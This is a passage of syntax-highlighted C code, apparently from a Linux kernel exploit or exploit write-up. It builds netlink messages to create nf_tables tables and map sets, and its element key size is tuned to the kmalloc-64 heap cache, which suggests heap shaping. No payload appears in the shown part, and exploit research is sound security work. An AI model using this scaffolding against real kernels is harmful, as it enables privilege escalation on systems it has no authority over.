</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_len <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg));
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_pid <span style=color:#666>=</span> <span style=color:#06287e>getpid</span>();
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_type <span style=color:#666>=</span> NFNL_MSG_BATCH_END;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> nlh;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// Netlink attributes
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020>#define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
</span></span></span><span style=display:flex><span><span style=color:#007020>#define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
</span></span></span><span style=display:flex><span><span style=color:#007020>#define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)
</span></span></span><span style=display:flex><span><span style=color:#007020>#define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + S8_NLA_SIZE)
</span></span></span><span style=display:flex><span><span style=color:#007020>#define KMALLOC64_KEYLEN \
</span></span></span><span style=display:flex><span><span style=color:#007020>  (64 - 8 - 12 -         \
</span></span></span><span style=display:flex><span><span style=color:#007020>   16)  </span><span style=color:#60a0b0;font-style:italic>// Max size - elemsize - sizeof(nft_set_ext)(align) - min datasize
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>uint8_t</span> zerobuf[<span style=color:#40a070>0x1000</span>] <span style=color:#666>=</span> {<span style=color:#40a070>0</span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// set_nested_attr(): Prepare a nested netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span><span style=color:#06287e>set_nested_attr</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr, <span style=color:#902000>uint16_t</span> type,
</span></span><span style=display:flex><span>                               <span style=color:#902000>uint16_t</span> data_len) {
</span></span><span style=display:flex><span>  attr<span style=color:#666>-&gt;</span>nla_type <span style=color:#666>=</span> type;
</span></span><span style=display:flex><span>  attr<span style=color:#666>-&gt;</span>nla_len <span style=color:#666>=</span> <span style=color:#06287e>NLA_ALIGN</span>(data_len <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr));
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)attr <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// set_u32_attr(): Prepare an integer netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span><span style=color:#06287e>set_u32_attr</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr, <span style=color:#902000>uint16_t</span> type,
</span></span><span style=display:flex><span>                            <span style=color:#902000>uint32_t</span> value) {
</span></span><span style=display:flex><span>  attr<span style=color:#666>-&gt;</span>nla_type <span style=color:#666>=</span> type;
</span></span><span style=display:flex><span>  attr<span style=color:#666>-&gt;</span>nla_len <span style=color:#666>=</span> U32_NLA_SIZE;
</span></span><span style=display:flex><span>  <span style=color:#666>*</span>(<span style=color:#902000>uint32_t</span> <span style=color:#666>*</span>)<span style=color:#06287e>NLA_ATTR</span>(attr) <span style=color:#666>=</span> <span style=color:#06287e>htonl</span>(value);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)attr <span style=color:#666>+</span> U32_NLA_SIZE;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// set_u64_attr(): Prepare a 64 bits integer netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span><span style=color:#06287e>set_u64_attr</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr, <span style=color:#902000>uint16_t</span> type,
</span></span><span style=display:flex><span>                            <span style=color:#902000>uint64_t</span> value) {
</span></span><span style=display:flex><span>  attr<span style=color:#666>-&gt;</span>nla_type <span style=color:#666>=</span> type;
</span></span><span style=display:flex><span>  attr<span style=color:#666>-&gt;</span>nla_len <span style=color:#666>=</span> U64_NLA_SIZE;
</span></span><span style=display:flex><span>  <span style=color:#666>*</span>(<span style=color:#902000>uint64_t</span> <span style=color:#666>*</span>)<span style=color:#06287e>NLA_ATTR</span>(attr) <span style=color:#666>=</span> <span style=color:#06287e>htobe64</span>(value);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)attr <span style=color:#666>+</span> U64_NLA_SIZE;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// set_str8_attr(): Prepare a 8 bytes long string netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @name: Buffer to copy into the attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span><span style=color:#06287e>set_str8_attr</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr, <span style=color:#902000>uint16_t</span> type,
</span></span><span style=display:flex><span>                             <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> name[<span style=color:#40a070>8</span>]) {
</span></span><span style=display:flex><span>  attr<span style=color:#666>-&gt;</span>nla_type <span style=color:#666>=</span> type;
</span></span><span style=display:flex><span>  attr<span style=color:#666>-&gt;</span>nla_len <span style=color:#666>=</span> S8_NLA_SIZE;
</span></span><span style=display:flex><span>  <span style=color:#06287e>memcpy</span>(<span style=color:#06287e>NLA_ATTR</span>(attr), name, <span style=color:#40a070>8</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)attr <span style=color:#666>+</span> S8_NLA_SIZE;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * set_binary_attr(): Prepare a byte array netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @attr: Attribute to fill
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @type: Type of the attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @buffer: Buffer with data to send
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @buffer_size: Size of the previous buffer
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span><span style=color:#06287e>set_binary_attr</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr, <span style=color:#902000>uint16_t</span> type,
</span></span><span style=display:flex><span>                               <span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>buffer, <span style=color:#902000>uint64_t</span> buffer_size) {
</span></span><span style=display:flex><span>  attr<span style=color:#666>-&gt;</span>nla_type <span style=color:#666>=</span> type;
</span></span><span style=display:flex><span>  attr<span style=color:#666>-&gt;</span>nla_len <span style=color:#666>=</span> <span style=color:#06287e>NLA_BIN_SIZE</span>(buffer_size);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>memcpy</span>(<span style=color:#06287e>NLA_ATTR</span>(attr), buffer, buffer_size);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)attr <span style=color:#666>+</span> <span style=color:#06287e>NLA_ALIGN</span>(<span style=color:#06287e>NLA_BIN_SIZE</span>(buffer_size));
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// nf_tables helper
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>//
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @nlsock: netlink socket to nf_tables
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @name: name of the table to create
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#902000>void</span> <span style=color:#06287e>create_nft_table</span>(<span style=color:#902000>int</span> nlsock, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>name) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> sockaddr_nl dest_nl;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> msghdr msg;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_batch_begin;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_payload;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_batch_end;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>nfgm;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> iovec iov[<span style=color:#40a070>3</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>dest_nl, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(dest_nl));
</span></span><span style=display:flex><span>  dest_nl.nl_family <span style=color:#666>=</span> AF_NETLINK;
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>msg, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nlh_batch_begin <span style=color:#666>=</span> <span style=color:#06287e>make_bacth_begin_nlmsghdr</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// create a table message
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>)<span style=color:#06287e>malloc</span>(TABLEMSG_SIZE);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (nlh_payload <span style=color:#666>==</span> <span style=color:#007020>NULL</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>fprintf</span>(stderr, <span style=color:#4070a0>&#34;[-] malloc</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(nlh_payload, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#666>*</span>nlh_payload));
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_flags <span style=color:#666>=</span> NLM_F_REQUEST;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_len <span style=color:#666>=</span> TABLEMSG_SIZE;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_pid <span style=color:#666>=</span> <span style=color:#06287e>getpid</span>();
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_seq <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_type <span style=color:#666>=</span> (NFNL_SUBSYS_NFTABLES <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>) <span style=color:#666>|</span> NFT_MSG_NEWTABLE;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nfgm <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_DATA</span>(nlh_payload);
</span></span><span style=display:flex><span>  nfgm<span style=color:#666>-&gt;</span>nfgen_family <span style=color:#666>=</span> NFPROTO_INET;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)nlh_payload <span style=color:#666>+</span> <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg));
</span></span><span style=display:flex><span>  <span style=color:#06287e>set_str8_attr</span>(nla, NFTA_TABLE_NAME, name);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nlh_batch_end <span style=color:#666>=</span> <span style=color:#06287e>make_bacth_end_nlmsghdr</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// put theme into iovec
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#06287e>memset</span>(iov, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(iov));
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>0</span>].iov_base <span style=color:#666>=</span> nlh_batch_begin;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>0</span>].iov_len <span style=color:#666>=</span> nlh_batch_begin<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>1</span>].iov_base <span style=color:#666>=</span> nlh_payload;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>1</span>].iov_len <span style=color:#666>=</span> nlh_payload<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>2</span>].iov_base <span style=color:#666>=</span> nlh_batch_end;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>2</span>].iov_len <span style=color:#666>=</span> nlh_batch_end<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  msg.msg_name <span style=color:#666>=</span> <span style=color:#666>&amp;</span>dest_nl;
</span></span><span style=display:flex><span>  msg.msg_namelen <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(dest_nl);
</span></span><span style=display:flex><span>  msg.msg_iov <span style=color:#666>=</span> iov;
</span></span><span style=display:flex><span>  msg.msg_iovlen <span style=color:#666>=</span> <span style=color:#40a070>3</span>;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> nbytes;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ((nbytes <span style=color:#666>=</span> <span style=color:#06287e>sendmsg</span>(nlsock, <span style=color:#666>&amp;</span>msg, <span style=color:#40a070>0</span>)) <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] sendmsg(create table)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>close</span>(nlsock);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] %d bytes sent</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, nbytes);
</span></span><span style=display:flex><span>  <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;    sendmsg&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_batch_begin);
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_payload);
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_batch_end);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>create_nft_set</span>(<span style=color:#902000>int</span> nlsock, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>set_name, <span style=color:#902000>uint32_t</span> set_key_len,
</span></span><span style=display:flex><span>                    <span style=color:#902000>uint32_t</span> set_data_len, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>table_name,
</span></span><span style=display:flex><span>                    <span style=color:#902000>uint32_t</span> id) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> msghdr msg;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> sockaddr_nl dest_nl;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_batch_begin;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_payload;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_batch_end;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>nfgm;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>nla;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> iovec iov[<span style=color:#40a070>3</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>dest_nl, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(dest_nl));
</span></span><span style=display:flex><span>  dest_nl.nl_family <span style=color:#666>=</span> AF_NETLINK;
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>msg, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nlh_batch_begin <span style=color:#666>=</span> <span style=color:#06287e>make_bacth_begin_nlmsghdr</span>();
</span></span><span style=display:flex><span>  nlh_batch_end <span style=color:#666>=</span> <span style=color:#06287e>make_bacth_end_nlmsghdr</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#902000>size_t</span> nlh_payload_size <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg);
</span></span><span style=display:flex><span>  nlh_payload_size <span style=color:#666>+=</span> S8_NLA_SIZE <span style=color:#666>*</span> <span style=color:#40a070>2</span>;  <span style=color:#60a0b0;font-style:italic>// NFTA_SET_TABLE &amp;&amp; NFTA_SET_NAME
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>+=</span>
</span></span><span style=display:flex><span>      U32_NLA_SIZE <span style=color:#666>*</span> <span style=color:#40a070>5</span>;  <span style=color:#60a0b0;font-style:italic>// NFTA_SET_[ID|KEY_LEN|FLAGS|DATA_TYPE|DATA_LEN]
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_SPACE</span>(nlh_payload_size);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nlh_payload <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>)<span style=color:#06287e>malloc</span>(nlh_payload_size);
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(nlh_payload, <span style=color:#40a070>0</span>, nlh_payload_size);
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_flags <span style=color:#666>=</span> NLM_F_REQUEST <span style=color:#666>|</span> NLM_F_CREATE;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_len <span style=color:#666>=</span> nlh_payload_size;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_pid <span style=color:#666>=</span> <span style=color:#06287e>getpid</span>();
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_seq <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_type <span style=color:#666>=</span> (NFNL_SUBSYS_NFTABLES <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>) <span style=color:#666>|</span> NFT_MSG_NEWSET;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nfgm <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>)<span style=color:#06287e>NLMSG_DATA</span>(nlh_payload);
</span></span><span style=display:flex><span>  nfgm<span style=color:#666>-&gt;</span>nfgen_family <span style=color:#666>=</span> NFPROTO_INET;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)nlh_payload <span style=color:#666>+</span> <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg));
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_str8_attr</span>(nla, NFTA_SET_TABLE, table_name);
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_str8_attr</span>(nla, NFTA_SET_NAME, set_name);
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_ID, id);
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_KEY_LEN, set_key_len);
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_DATA_LEN, set_data_len);
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_DATA_TYPE, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_FLAGS, NFT_SET_MAP);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(iov, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(iov));
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>0</span>].iov_base <span style=color:#666>=</span> nlh_batch_begin;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>0</span>].iov_len <span style=color:#666>=</span> nlh_batch_begin<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>1</span>].iov_base <span style=color:#666>=</span> nlh_payload;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>1</span>].iov_len <span style=color:#666>=</span> nlh_payload<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>2</span>].iov_base <span style=color:#666>=</span> nlh_batch_end;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>2</span>].iov_len <span style=color:#666>=</span> nlh_batch_end<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  msg.msg_name <span style=color:#666>=</span> <span style=color:#666>&amp;</span>dest_nl;
</span></span><span style=display:flex><span>  msg.msg_namelen <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(dest_nl);
</span></span><span style=display:flex><span>  msg.msg_iov <span style=color:#666>=</span> iov;
</span></span><span style=display:flex><span>  msg.msg_iovlen <span style=color:#666>=</span> <span style=color:#40a070>3</span>;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> nbytes;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ((nbytes <span style=color:#666>=</span> <span style=color:#06287e>sendmsg</span>(nlsock, <span style=color:#666>&amp;</span>msg, <span style=color:#40a070>0</span>)) <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] sendmsg(create set)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>close</span>(nlsock);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] %d bytes sent</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, nbytes);
</span></span><span style=display:flex><span>  <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;    sendmsg&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_batch_begin);
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_payload);
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_batch_end);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>add_elem_to_nft_set</span>(<span style=color:#902000>int</span> nlsock, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>set_name, <span style=color:#902000>uint32_t</span> set_keylen,
</span></span><span style=display:flex><span>                         <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>table_name, <span style=color:#902000>uint32_t</span> id, <span style=color:#902000>uint32_t</span> data_len,
</span></span><span style=display:flex><span>                         <span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>data) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> msghdr msg;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> sockaddr_nl dest_nl;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_batch_begin;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_payload;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_batch_end;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>nfgm;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr;
</span></span><span style=display:flex><span>  <span style=color:#902000>uint64_t</span> nlh_payload_size;
</span></span><span style=display:flex><span>  <span style=color:#902000>uint64_t</span> nested_attr_size;
</span></span><span style=display:flex><span>  <span style=color:#902000>size_t</span> first_element_size;
</span></span><span style=display:flex><span>  <span style=color:#902000>size_t</span> second_element_size;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> iovec iov[<span style=color:#40a070>3</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>dest_nl, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(dest_nl));
</span></span><span style=display:flex><span>  dest_nl.nl_family <span style=color:#666>=</span> AF_NETLINK;
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>msg, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
</span></span><span style=display:flex><span>
